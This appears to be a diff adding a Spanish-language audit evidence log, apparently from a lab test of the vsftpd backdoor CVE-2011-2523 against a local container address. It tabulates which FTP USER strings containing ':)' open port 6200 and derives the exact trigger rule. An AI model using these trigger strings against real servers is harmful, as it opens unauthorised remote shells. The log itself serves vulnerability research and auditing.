@@ -1,0 +1,31 @@
+================================================================
+ Tproot — Evidencia de auditoría (CVE-2011-2523)
+ Fecha (UTC) : 2026-10-18T22:18:01Z
+ Objetivo    : 172.17.0.2
+ Fase        : Fase 2 — Matriz de casos que aisla la regla del trigger
+ Comando     : USER <caso> + PASS x  ->  se abre el 6200 ?
+================================================================
+
+CASO                          RESPUESTA PASS      6200 ABIERTO   INTERPRETACION
+----------------------------  ------------------  --------------  --------------------------
+backdoor:)                    (sin respuesta)     SI              referencia
+a:)                           (sin respuesta)     SI              magic en offset 1
+ab:)                          (sin respuesta)     SI
+x:)y                          (sin respuesta)     SI              magic en medio
+abc:)                         (sin respuesta)     SI
+:)                            530 Login incorrect NO             primer caracter ':' -> descartado
+:))                           530 Login incorrect NO
+::)                           530 Login incorrect NO
+:)x                           530 Login incorrect NO
+:)x:)                         530 Login incorrect NO
+:x)                           530 Login incorrect NO
+ :)                           530 Login incorrect NO
+a :)                          530 Login incorrect NO
+backdoor:) SIN PASS           (no procede)        NO              PASS es obligatorio
+
+REGLA EMPIRICA
+  1. El usuario DEBE empezar por [A-Za-z0-9_.]   (validacion de handle_login)
+  2. El usuario NO puede contener espacios antes de ':)'  (str_contains_space
+     retorna 1 en el primer espacio y el escaneo se detiene)
+  3. El usuario DEBE contener ':)'
+  4. Tras el USER DEBE enviarse un PASS
